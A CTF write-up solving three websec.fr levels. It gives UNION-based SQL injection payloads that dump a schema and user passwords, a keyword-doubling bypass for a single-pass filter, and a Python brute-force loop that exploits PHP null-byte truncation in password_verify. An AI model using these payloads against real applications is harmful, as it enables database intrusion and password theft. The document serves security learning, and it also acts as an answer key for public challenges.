                            websec.fr CTF writeups


Level 01:
---------
    It's simple SQL injection, We first find out the query used to create the table.
    
    -1 UNION SELECT 'xyz', GROUP_CONCAT(sql) FROM sqlite_master;--

    Now to extract the password, we again use UNION & GROUP_CONCAT and we get the flag.
    -1 UNION SELECT 'xyz', GROUP_CONCAT(password) FROM users;--

Level 02:
---------
    It’s a similar level as the previous one, but now few keywords are getting replaced with the empty string. As preg_replace only does one pass while replacing. We can use something like SELSELECTECT which will result in inner SELECT getting replaced with an empty string and resulting in the final SELECT string.

    The following keywords were found to be filtered by the application using preg_replace (): union, order, select, from, group, by.

    NewPayload:
        -1 UNIOUNIONN SELECSELECTT 'xyz', GROUGROUPP_CONCAT(password) FROFROMM users;--


Level 03:
----------
    Challenge:
    ----------
    Since php types are idiotic-sloppy, it's safer to hash the raw variables first, with sha1 (that does accept arrays and other weird things), then to hash the result with password_hash to avoid funny stuff.
    To compare them, we're using password_verify, since its implementation is foolproof. 

    This level introduces a bug that occurs at PHP’s C implementation. In its implementation, it uses char* to store the input value because of this string past null character gets discarded. Something else to notice here is that it is using fa1se instead of false in these two mentioned lines because of which hash gets returned in raw format

    $h2 = password_hash (sha1($_POST['c'], fa1se), PASSWORD_BCRYPT);
    if (password_verify (sha1($flag, fa1se), $h2) === true {

    Now we have flag's hash which is '7c00249d409a91ab84e3f421c193520d9fb3674b' and it has null
    byte at second position. So, effectively this make 'password_verfiy' the first
    parameter to be byte 7c. Now if we find and string whose sha1 start with 7c00, then we can 
    get flag.

    Code:
      import hashlib
      sha1 = lambda x:hashlib.sha1(str(x)).hexdigest()
      
      i = 0
      while True:
        if sha1(i).startswith("7c00"):
            print(i)
            break
        i += 1
    
    We get 104610 and entring the same as input gives us the flag.



